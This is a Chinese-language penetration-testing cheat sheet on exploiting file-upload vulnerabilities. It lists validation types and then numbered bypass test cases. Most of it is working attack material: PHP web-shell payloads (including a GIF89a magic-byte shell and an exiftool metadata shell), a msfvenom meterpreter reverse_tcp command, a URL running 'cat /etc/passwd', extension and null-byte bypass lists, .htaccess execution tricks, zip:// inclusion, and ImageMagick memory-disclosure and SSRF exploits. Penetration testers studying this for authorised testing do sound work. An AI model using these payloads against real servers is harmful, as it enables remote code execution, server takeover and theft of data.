# 介绍

- 文件上传漏洞是在线应用程序中一个值得关注的问题。如果 Web 应用程序存在此类漏洞，攻击者可以上传包含恶意代码的文件，并在服务器上执行。攻击者很可能会在网站中放置钓鱼页面或对其进行破坏，以便将 Web 服务器的内部数据泄露给其他人。
- 允许最终用户上传文件，尤其是在没有充分了解相关风险的情况下，无异于打开服务器入侵的闸门。当然，尽管围绕最终用户上传文件功能存在安全隐患，但在现代 Web 应用程序中，这已日益成为一项普遍的需求。
- 文件上传存在重大风险，但许多人并未意识到这一点，也未了解如何防范滥用。更糟糕的是，一些 Web 应用程序包含不安全、不受限制的文件上传机制。
- 请务必阅读“参考资料中的第一个链接！！”，这是一篇很棒的博客，然后再继续阅读。



## 利用文件上传漏洞

- Remote code execution
- SSRF
- XSS
- LFI
- XXE
- Phishing
- Parameter pollution
- uploaders may disclose internal paths
- [SQL injection](https://security.stackexchange.com/questions/29014/are-image-uploads-also-vulnerable-to-sql-injection)
- DoS attack
- Many More...

## 导致成功上传的文件拓展名

- Extensions Impact
  - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
  - `SVG`: Stored XSS, SSRF, XXE
  - `GIF`: Stored XSS, SSRF
  - `CSV`: CSV injection
  - `XML`: XXE
  - `AVI`: LFI, SSRF
  - `HTML`, `JS` : HTML injection, XSS, Open redirect
  - `PNG`, `JPEG`: Pixel flood attack (DoS)
  - `ZIP`: RCE via LFI, DoS
  - `PDF`, `PPTX`: SSRF, BLIND XXE
  - `SCF` : RCE



# 文件上传中的验证类型

还有其他几种，但主要的有 5 种类型，其他类型包括文件签名验证、文件内容验证、文件存储位置，它们都提供进一步的保护。

## 客户端验证

客户端验证是一种在输入实际发送到服务器之前进行的验证。它通过 JavaScript、VBScript 或 HTML5 属性在 Web 浏览器上进行。程序员使用这种类型的验证，通过在浏览器级别快速响应来提供更好的用户体验。
例如，错误信息仅允许使用 .jpg 文件。



## 文件名验证

文件名验证是指服务器通过检查文件扩展名来验证上传的文件。这种验证基于多种方法，其中最常用的两种方法是将文件扩展名列入黑名单和将文件扩展名列入白名单。

黑名单文件扩展名是一种保护措施，服务器只会拒绝特定扩展名，例如 php、aspx。

而白名单文件扩展名则恰恰相反，只允许少数文件扩展名上传到服务器，例如 jpg、jpeg、gif。



### Content-type / MIME-typ 验证

Content-Type 验证是指服务器通过检查文件的 MIME 类型（可在 http 请求中显示）来验证文件内容。

例如，某些图片文件上传会通过检查文件的 Content-Type 是否为图片类型来验证上传的图片。
例如：Content-type: image/png



## Content-Length 验证

内容长度验证是指服务器检查上传文件内容的长度，并限制文件大小。虽然这种验证方式并不常用，但在某些文件上传中会用到。
例如：文件大小不得超过 10 个字节。



## 检查图像头部内容

当仅允许上传图片时，大多数 Web 应用程序通常会使用服务器端函数（例如 PHP 中的 getimagesize()）来验证图片头。调用此函数时，它会返回图片的大小。

如果文件不是有效的图片，即文件头不是图片的头，则该函数将返回 FALSE。

因此，许多 Web 应用程序通常会检查该函数返回的是 TRUE 还是 FALSE，并根据这些信息来验证上传的文件。
可以使用魔法数字来绕过此验证。

[常见的图像头部签名](https://en.wikipedia.org/wiki/List_of_file_signatures)



# 测试文件上传漏洞并利用

## 基本步骤

```
1. 浏览网站并找到每个上传功能。
2. 使用 Weevely 上传一个 Web Shell 进行基本测试
`weevely generate <password> <path>`
或
使用 Msfvenom `msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw`
3. 如果失败，请尝试使用扩展程序绕过
4. 尝试更改内容类型以进行绕过
5. 尝试使用 Magic 数字绕过
6. 尝试使用 Polygot 或 PNG IDAT 数据块绕过
7. 最后，如果成功，则上传小型 POC 或进一步利用漏洞。

```



## 测试案例1：黑名单绕过

```
1. 找到上传请求并将其发送到repeater
2. 现在开始测试哪个文件扩展名被列入黑名单，更改 `filename=` 参数

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

--------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

3. 尝试所有扩展名

**PHP** → .phtm、phtml、.phps、.pht、.php2、.php3、.php4、.php5、.shtml、.phar、.pgif、.inc
**ASP** → asp、.aspx、.cer、.asa
**Jsp** → .jsp、.jspx、.jsw、.jsv、.jspf
**Coldfusion** → .cfm、.cfml、.cfc、.dbm
**使用随机大小写** → .pHp、.pHP5、.PhAr

更多信息请访问 PayloadAllThings 和 https://book.hacktricks.xyz/pentesting-web/file-upload

4. 如果成功，则进一步利用，否则可能是其他类型的验证或
检查，因此请尝试其他绕过方法。
```



## 测试案例2：白名单绕过

```
1. 找到上传请求并将其发送到repeater
2. 现在开始测试哪个文件扩展名已列入白名单，请更改 `filename=` 参数

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

--------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.jpg"
Content-Type: application/x-php

3. 尝试所有扩展名

file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg 上传文件时也可以这样做，将其命名为 file.phpD.jpg，并将十六进制的 D (44) 更改为 00。
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.php#.png
file.
.html

4. 如果不成功，尝试使用入侵器进行暴力破解，确定哪个扩展名可以接受，然后再试一次。
5. 如果成功，则进一步利用，或者可能存在其他类型的验证或
检查，尝试其他绕过方法。
```



## 测试案例3：Content-Type 验证

```
1. 找到上传请求并将其发送到repeater
2. 上传 file.php 文件，并将 Content-type: application/x-php 或 Content-Type: application/octet-stream 更改为 Content-type: image/png 或 Content-type: image/gif 或 Content-type: image/jpg

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

--------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

3. 如果成功，则进一步利用，或者可能存在其他类型的验证或
检查，因此请尝试其他绕过方法。
```



## 测试案例4：Content-Length 验证

```
1. 找到上传请求并将其发送到reapter
2. 首先尝试以上三种绕过方法，如果无效，则检查文件大小是否已检查。结合尝试以上四种方法，以提高成功率。

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

3. 尝试小文件负载，例如

<?=`$_GET[x]`?>
<?=‘ls’; 注意：<? 适用于 php.ini 文件中的“short_open_tag=On”（默认值为 On）。

4. 最终请求应如下所示。如果成功，请尝试访问此文件
例如：http://example.com/compromised_file.php?x=cat%20%2Fetc%2Fpasswd

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

--------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

<?=`$_GET[x]`?>

5. 不要止步于此，上传更好的shell，看看能否找到更关键的内容，例如DB_。
```



## 测试案例5:Content 绕过/使用 魔术字节

```
1. 找到上传请求并将其发送到repeater
2. 首先尝试以上四种绕过方法，如果不奏效，则查看文件内容是否已检查。结合尝试以上五种方法，以提高成功率。

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

3. 将 Content-Type: application/x-php 更改为 Content-Type: image/gif，并在执行 Shellcode 之前添加文本“GIF89a;”。

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system($_GET['cmd']); ?>

4. 尝试更多链接 https://en.wikipedia.org/wiki/List_of_file_signatures 并相应地更改
Content-Type:
5. 如果成功，上传更好的 Shell 和 POC，看看如何提高关键性能。
```



## 测试案例6: 魔术字节和源数据shell

```
1. 找到上传请求并将其发送到repeater
2. 首先尝试以上所有绕过方法，如果无效，则检查文件内容是否经过检查。结合尝试以上六种方法，以提高成功率。

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

4. 首先通过将 Content-Type 标头的值设置为 image/png、text/plain、application/octet-stream 来绕过 Content-Type 检查。
5. 使用 exiftool 工具将 shell 引入元数据中。

exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

6. 现在尝试上传这张修改后的 img.jpg
7. 进一步利用漏洞，提升临界值。
```



## 测试案例7：上传配置文件

```
1. 找到上传请求并将其发送到repeater
2. 如果应用使用的是 PHP 服务器，则尝试上传 .htaccess 文件；否则，
如果应用使用的是 ASP 服务器，则尝试上传 .config 文件
3. 如果您可以上传 .htaccess 文件，则可以进行多项配置，
甚至可以执行代码（配置后缀为 .htaccess 的文件可以被执行）。
您可以在此处找到不同的 .htaccess shell：https://github.com/wireghoul/htshells
或者
如果您可以上传 .config 文件并使用它们执行代码。一种方法是
将代码附加到文件末尾的 HTML 注释中：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config
更多关于此漏洞的信息和利用技巧，请访问：https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
4. 服务器配置已更改，尝试利用此漏洞并上传 shell
例如，如果您上传了 .htaccess 文件，并在内容中添加了
AddType application/x-httpd-php .png ，则此配置将指示 Apache HTTP 服务器将 PNG 图像作为 PHP 脚本执行。
5. 现在只需上传扩展名为 .png 的 php shell 文件即可。
6. 完成后，尝试进一步利用。
```



## 测试案例9：尝试zip上传

```
1. 找到上传请求并将其发送到repeater
2. 现在检查 .zip 文件是否允许上传
3. 如果网站接受 .zip 文件，请上传 .php 文件并将其压缩为 .zip 文件再上传。
4. 现在访问 site.com/path?page=zip://path/file.zip%23rce.php

如果您也想尝试此工具及其相关信息，请访问：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip
```



## 测试案例10：尝试ImageMagick

```
检查参考：https://hackerone.com/reports/302885 , https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e
1. 找到上传功能，例如个人资料图片上传。
2. 在你的系统中使用 Git clone https://github.com/neex/gifoeb。
3. 进入 gifoeb 目录并运行以下命令：

./gifoeb gen 512x512 dump.gif

这将创建可利用的 dump.gif 文件，其中 512x512 为像素尺寸，
dump.gif 为 gif 文件。

你也可以尝试绕过一些检查。

a) ./gifoeb gen 1123x987 dump.jpg
b) ./gifoeb gen 1123x987 dump.png
c) ./gifoeb gen 1123x987 dump.bmp
d) ./gifoeb gen 1123x987 dump.tiff
e) ./gifoeb gen 1123x987 dump.tif

（它将创建具有不同扩展名的转储文件。请尝试使用哪个网站）
4. 创建可利用文件后，只需在配置文件设置中上传即可。
使用修改后的图像文件。
5. 服务器将返回不同的像素文件。下载此文件。
6. 保存并恢复像素文件。

for p in previews/*; do
./gifoeb recover $p | strings;
完成

7. 更多详情请访问 https://github.com/neex/gifoeb

########################### 另一种方法 #############################

参考：https://www.exploit-db.com/exploits/39767 , https://hackerone.com/reports/135072

1. 找到上传功能。
2. 创建一个扩展名为 .mvg 的文件，并在其中添加以下代码。

push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context

这里的 example.com 可以是您的 burp 协作 URL，也可以是您可以接收 HTTP 请求的网站。
3. 现在使用以下命令：

convert ssrf.mvg out.png

4. 上传图片，看看是否收到了 HTTP 请求。

在这里找到现成的和更多的有效载荷：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik
```



# Mindmap

![File_Upload_MindMap](https://user-images.githubusercontent.com/33719912/193826710-b6d71979-04f4-42a6-a9c6-7d14784de9d4.png)




